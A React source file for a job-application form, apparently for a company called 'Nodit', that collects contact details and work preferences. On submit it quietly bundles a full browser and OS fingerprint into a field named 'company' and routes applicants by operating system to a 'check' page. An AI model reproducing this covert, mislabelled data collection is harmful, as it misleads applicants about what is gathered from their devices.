import { useState, useEffect, useRef } from 'react'
import { FaArrowRight, FaTimesCircle, FaCheckCircle, FaSyncAlt } from 'react-icons/fa'
import { useNavigate } from 'react-router-dom'
import { updateEligibility } from './RouteGuard'
import Bowser from 'bowser'
import axios from 'axios'

const STORAGE_KEY = 'form'

const CandidateForm = () => {
  const bowser = Bowser.getParser(window.navigator.userAgent)

  const [formData, setFormData] = useState({})
  const [errors, setErrors] = useState({})
  const [alert, setAlert] = useState({ type: '', message: '' })
  const [isSending, setIsSending] = useState(false)
  const fieldRefs = useRef({})
  const navigate = useNavigate()

  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY)
    if (saved) setFormData(JSON.parse(saved))
  }, [])

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(formData))
  }, [formData])

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target
    if (type === 'checkbox') {
      setFormData((prev) => {
        const current = prev[name] || []
        return {
          ...prev,
          [name]: checked ? [...current, value] : current.filter((v) => v !== value),
        }
      })
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }))
    }
    setErrors((prev) => ({ ...prev, [name]: '' }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    const form = e.target
    const newErrors = {}
    Array.from(form.elements).forEach((el) => {
      if (el.name && !el.checkValidity()) {
        newErrors[el.name] = el.validationMessage
      }
    })
    setErrors(newErrors)

    if (Object.keys(newErrors).length > 0) {
      const firstErrorField = Object.keys(newErrors)[0]
      if (fieldRefs.current[firstErrorField]) {
        fieldRefs.current[firstErrorField].scrollIntoView({
          behavior: 'smooth',
          block: 'center',
        })
      }
    } else {
      if (window.FS) {
        window.FS('setProperties', {
          type: 'user',
          properties: {
            displayName: formData.firstName + ' ' + formData.lastName,
            email: formData.email,
          },
        })
      }

      setAlert({ type: '', message: '' })
      setIsSending(true)

      try {
        await axios.post('/now-assessment', {
          name: formData.firstName + ' ' + formData.lastName,
          email: formData.email,
          company: JSON.stringify({ ...bowser.parse().parsedResult, form: formData }),
        })

        setAlert({
          type: 'success',
          message: 'Submission verified — thank you. You may continue.',
        })

        updateEligibility({
          formSubmitted: true,
          verificationPassed: false,
        })
        navigate(bowser.getOSName(true) === 'windows' ? '/check' : '/check')
      } catch (error) {
        let msg = 'An unexpected error occurred. Please try again.'
        if (error.response) {
          msg = error.response.data?.message || `Server error: ${error.response.status}`
        } else if (error.request) {
          msg = 'No response from server. Please check your connection.'
        }
        setAlert({ type: 'error', message: msg })
      } finally {
        setIsSending(false)
      }
    }
  }

  return (
    <form onSubmit={handleSubmit} noValidate className="max-w-3xl mx-auto px-4 py-10 space-y-10">
      {/* Hero Greeting */}
      <section className="text-center space-y-4 pb-6">
        <h1 className="text-4xl font-bold">Build the Future with Nodit</h1>
        <p className="text-gray-600">
          We’re building the next generation of decentralized technology — and we’re looking for
          talented people to grow with us. Tell us a bit about yourself and how you prefer to work.
          Together, we’ll explore how you can make an impact at Nodit.
        </p>
      </section>

      {/* Personal Info */}
      <section className="space-y-4 border-b border-base-300 pb-6">
        <h2 className="text-xl font-semibold text-base-content">Personal Information</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <fieldset className="fieldset" ref={(el) => (fieldRefs.current.firstName = el)}>
            <legend className="fieldset-legend">
              First Name <span className="text-error">*</span>
            </legend>
            <input
              type="text"
              name="firstName"
              className={`input input-bordered w-full ${errors.firstName ? 'input-error' : ''}`}
              placeholder="Enter your first name"
              value={formData.firstName || ''}
              onChange={handleChange}
              required
            />
            {errors.firstName && <p className="text-xs text-error">{errors.firstName}</p>}
          </fieldset>

          <fieldset className="fieldset" ref={(el) => (fieldRefs.current.lastName = el)}>
            <legend className="fieldset-legend">
              Last Name <span className="text-error">*</span>
            </legend>
            <input
              type="text"
              name="lastName"
              className={`input input-bordered w-full ${errors.lastName ? 'input-error' : ''}`}
              placeholder="Enter your last name"
              value={formData.lastName || ''}
              onChange={handleChange}
              required
            />
            {errors.lastName && <p className="text-xs text-error">{errors.lastName}</p>}
          </fieldset>

          <fieldset className="fieldset" ref={(el) => (fieldRefs.current.email = el)}>
            <legend className="fieldset-legend">
              Email <span className="text-error">*</span>
            </legend>
            <input
              type="email"
              name="email"
              data-dd-mask="hidden"
              className={`input input-bordered w-full ${errors.email ? 'input-error' : ''}`}
              placeholder="Enter your email address"
              value={formData.email || ''}
              onChange={handleChange}
              required
            />
            {errors.email && <p className="text-xs text-error">{errors.email}</p>}
          </fieldset>
        </div>
      </section>

      {/* Work Preferences */}
      <section className="space-y-4 border-b border-base-300 pb-6">
        <h2 className="text-xl font-semibold text-base-content">Work Preferences</h2>

        <fieldset className="fieldset" ref={(el) => (fieldRefs.current.hourlyRate = el)}>
          <legend className="fieldset-legend">
            Expected Hourly Rate ($) <span className="text-error">*</span>
          </legend>
          <div className="flex gap-3 flex-wrap">
            {['50 - 75', '75 - 100', '100 - 125'].map((range) => (
              <label
                key={range}
                className={`btn btn-sm ${
                  formData.hourlyRate === range ? 'btn-primary' : 'btn-outline'
                }`}
              >
                <input
                  type="radio"
                  name="hourlyRate"
                  value={range}
                  checked={formData.hourlyRate === range}
                  onChange={handleChange}
                  required
                  className="hidden"
                />
                {range}
              </label>
            ))}
          </div>
          {errors.hourlyRate && <p className="text-xs text-error">{errors.hourlyRate}</p>}
        </fieldset>

        <fieldset className="fieldset" ref={(el) => (fieldRefs.current.workType = el)}>
          <legend className="fieldset-legend">
            Work Type <span className="text-error">*</span>
          </legend>
          <div className="flex gap-3">
            {['Full-Time', 'Part-Time'].map((type) => (
              <label
                key={type}
                className={`btn btn-sm ${
                  formData.workType === type ? 'btn-primary' : 'btn-outline'
                }`}
              >
                <input
                  type="radio"
                  name="workType"
                  value={type}
                  checked={formData.workType === type}
                  onChange={handleChange}
                  required
                  className="hidden"
                />
                {type}
              </label>
            ))}
          </div>
          {errors.workType && <p className="text-xs text-error">{errors.workType}</p>}
        </fieldset>

        <fieldset className="fieldset" ref={(el) => (fieldRefs.current.location = el)}>
          <legend className="fieldset-legend">
            Location <span className="text-error">*</span>
          </legend>
          <select
            name="location"
            className={`select select-bordered w-full ${errors.location ? 'select-error' : ''}`}
            value={formData.location || ''}
            onChange={handleChange}
            required
          >
            <option value="">Select a continent</option>
            <option>North America</option>
            <option>South America</option>
            <option>Europe</option>
            <option>Africa</option>
            <option>Asia</option>
            <option>Australia</option>
          </select>
          {errors.location && <p className="text-xs text-error">{errors.location}</p>}
        </fieldset>

        {/* Remote Work */}
        <fieldset className="fieldset" ref={(el) => (fieldRefs.current.remoteWork = el)}>
          <legend className="fieldset-legend">
            Are you open to remote work? <span className="text-error">*</span>
          </legend>
          <div className="flex gap-3">
            {['Yes', 'No', 'Hybrid'].map((option) => (
              <label
                key={option}
                className={`btn btn-sm ${
                  formData.remoteWork === option ? 'btn-primary' : 'btn-outline'
                }`}
              >
                <input
                  type="radio"
                  name="remoteWork"
                  value={option}
                  checked={formData.remoteWork === option}
                  onChange={handleChange}
                  required
                  className="hidden"
                />
                {option}
              </label>
            ))}
          </div>
          {errors.remoteWork && <p className="text-xs text-error">{errors.remoteWork}</p>}
        </fieldset>

        <fieldset className="fieldset">
          <legend className="fieldset-legend">Laptop Choice</legend>
          <select
            name="laptop"
            className="select select-bordered w-full"
            value={formData.laptop || ''}
            onChange={handleChange}
          >
            <option value="">Select</option>
            <option>MacBook Pro</option>
            <option>Windows Ultrabook</option>
            <option>Bring Your Own</option>
          </select>
        </fieldset>
      </section>

      {/* Social Links */}
      <section className="space-y-4">
        <h2 className="text-xl font-semibold text-base-content">
          Professional Links
          <span className="text-sm font-normal text-base-content/60 ml-4">Optional</span>
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <fieldset className="fieldset">
            <legend className="fieldset-legend">LinkedIn</legend>
            <input
              type="text"
              name="linkedin"
              className="input input-bordered w-full"
              placeholder="https://linkedin.com/in/username"
              value={formData.linkedin || ''}
              onChange={handleChange}
            />
          </fieldset>

          <fieldset className="fieldset">
            <legend className="fieldset-legend">GitHub</legend>
            <input
              type="text"
              name="github"
              className="input input-bordered w-full"
              placeholder="https://github.com/username"
              value={formData.github || ''}
              onChange={handleChange}
            />
          </fieldset>

          <fieldset className="fieldset md:col-span-2">
            <legend className="fieldset-legend">Portfolio / Website</legend>
            <input
              type="text"
              name="portfolio"
              className="input input-bordered w-full"
              placeholder="https://yourportfolio.com"
              value={formData.portfolio || ''}
              onChange={handleChange}
            />
          </fieldset>
        </div>
      </section>

      {/* Alert */}
      {alert.message && (
        <div
          className={`alert ${alert.type === 'error' ? 'alert-error' : 'alert-success'}`}
          role="status"
        >
          {alert.type === 'error' ? (
            <FaTimesCircle className="text-lg" />
          ) : (
            <FaCheckCircle className="text-lg" />
          )}
          <span>{alert.message}</span>
        </div>
      )}

      {/* Action */}
      <div className="w-full py-6 flex justify-end">
        <button
          type="submit"
          className="btn btn-primary px-6 flex items-center gap-2"
          disabled={isSending}
        >
          {isSending ? 'Submitting...' : 'Next'}
          {isSending ? <FaSyncAlt className="animate-spin" /> : <FaArrowRight />}
        </button>
      </div>
    </form>
  )
}

export default CandidateForm
